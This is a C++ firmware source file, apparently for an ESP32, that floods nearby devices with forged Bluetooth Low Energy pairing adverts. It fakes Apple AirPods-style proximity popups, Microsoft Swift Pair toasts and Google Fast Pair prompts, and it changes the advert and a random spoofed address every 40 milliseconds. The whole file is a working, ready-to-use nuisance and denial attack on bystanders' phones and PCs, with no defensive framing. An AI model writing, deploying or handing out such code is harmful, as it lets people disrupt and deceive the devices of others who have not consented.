// blespam.cpp -- BLE advertisement spam (see blespam.h).
#include "blespam.h"
#include "ble_hid.h"
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"

static const char* TAG = "blespam";

#define TICK_MS 40           // rotate advert + address every 40ms (~25/s)

static bool               g_running = false;
static volatile uint32_t  g_sent    = 0;
static int                g_mode    = BLESPAM_ALL;
static esp_timer_handle_t g_tmr      = 0;

static int spam_gap_cb(struct ble_gap_event* e, void* arg) { (void)e; (void)arg; return 0; }

static uint32_t rnd(void) { return esp_random(); }

static void set_rand_addr(void) {
  uint8_t a[6];
  for (int i = 0; i < 6; i++) a[i] = rnd() & 0xff;
  a[5] |= 0xC0;                                   // static random (two MSB = 11)
  ble_hs_id_set_rnd(a);
}

// Apple proximity-pair advert (iOS "connect" popup). 31-byte manufacturer AD.
static int build_apple(uint8_t* b) {
  static const uint8_t models[][2] = {
    {0x0e,0x20},{0x0a,0x20},{0x0f,0x20},{0x13,0x20},{0x14,0x20},
    {0x03,0x20},{0x0c,0x20},{0x11,0x20},{0x16,0x20},{0x02,0x20},
  };
  int m = rnd() % (int)(sizeof(models) / sizeof(models[0]));
  int o = 0;
  b[o++] = 0x1e; b[o++] = 0xff; b[o++] = 0x4c; b[o++] = 0x00;  // len, mfr, Apple
  b[o++] = 0x07; b[o++] = 0x19; b[o++] = 0x07;                 // continuity type
  b[o++] = models[m][0]; b[o++] = models[m][1];                // device model
  b[o++] = 0x55;
  for (int i = 0; i < 21; i++) b[o++] = (i < 4) ? (rnd() & 0xff) : 0x00;
  return o;                                                    // 31 bytes
}

// Microsoft Swift Pair advert (Windows "add a device" toast).
static int build_ms(uint8_t* b) {
  static const char* names[] = {
    "Xbox Controller", "Surface Pen", "Surface Keyboard",
    "Surface Mouse", "Surface Dock", "Precision Mouse",
  };
  const char* nm = names[rnd() % (int)(sizeof(names) / sizeof(names[0]))];
  int nl = (int)strlen(nm);
  if (nl > 20) nl = 20;
  int o = 0;
  b[o++] = (uint8_t)(6 + nl);                     // AD length
  b[o++] = 0xff; b[o++] = 0x06; b[o++] = 0x00;    // mfr-specific, Microsoft
  b[o++] = 0x03; b[o++] = 0x00; b[o++] = 0x80;    // Swift Pair beacon
  memcpy(b + o, nm, nl); o += nl;
  return o;
}

// Google Fast Pair advert (Android pairing popup).
static int build_google(uint8_t* b) {
  static const uint8_t ids[][3] = {
    {0xcd,0x82,0x56},{0x00,0x00,0x06},{0x4c,0xe9,0x5f},
    {0x00,0x18,0x0f},{0x92,0xba,0x96},{0x0b,0x89,0x1a},
  };
  int m = rnd() % (int)(sizeof(ids) / sizeof(ids[0]));
  int o = 0;
  b[o++] = 0x03; b[o++] = 0x03; b[o++] = 0x2c; b[o++] = 0xfe;  // svc UUID 0xFE2C
  b[o++] = 0x06; b[o++] = 0x16; b[o++] = 0x2c; b[o++] = 0xfe; b[o++] = 0x00;
  b[o++] = ids[m][0]; b[o++] = ids[m][1]; b[o++] = ids[m][2]; // model id
  return o;
}

static void tick_cb(void* arg) {
  (void)arg;
  uint8_t buf[31];
  int len;
  int mode = g_mode;
  if (mode == BLESPAM_ALL) mode = rnd() % 3;
  if      (mode == BLESPAM_APPLE)  len = build_apple(buf);
  else if (mode == BLESPAM_MS)     len = build_ms(buf);
  else                             len = build_google(buf);

  ble_gap_adv_stop();
  set_rand_addr();
  struct ble_gap_adv_params ap;
  memset(&ap, 0, sizeof ap);
  ap.conn_mode = BLE_GAP_CONN_MODE_NON;           // non-connectable advert
  ap.disc_mode = BLE_GAP_DISC_MODE_GEN;
  if (ble_gap_adv_set_data(buf, len) != 0) return;
  if (ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
                        &ap, spam_gap_cb, NULL) == 0)
    g_sent = g_sent + 1;
}

bool blespam_start(int mode) {
  g_mode = mode;
  bhid_start("Nexus");    // bring NimBLE host up (first call) ...
  bhid_stop();            // ... then halt HID advertising; host stays resident
  g_sent = 0;
  if (g_running) return true;
  esp_timer_create_args_t ta = {};
  ta.callback = tick_cb;
  ta.name     = "blespam";
  if (esp_timer_create(&ta, &g_tmr) != ESP_OK) return false;
  esp_timer_start_periodic(g_tmr, (uint64_t)TICK_MS * 1000);
  g_running = true;
  ESP_LOGI(TAG, "ble spam start mode=%d", mode);
  return true;
}

void blespam_stop(void) {
  if (!g_running) return;
  if (g_tmr) { esp_timer_stop(g_tmr); esp_timer_delete(g_tmr); g_tmr = 0; }
  ble_gap_adv_stop();
  g_running = false;
  ESP_LOGI(TAG, "ble spam stop (sent %u)", (unsigned)g_sent);
}

bool     blespam_running(void) { return g_running; }
uint32_t blespam_sent(void)    { return g_sent; }
int      blespam_mode(void)    { return g_mode; }
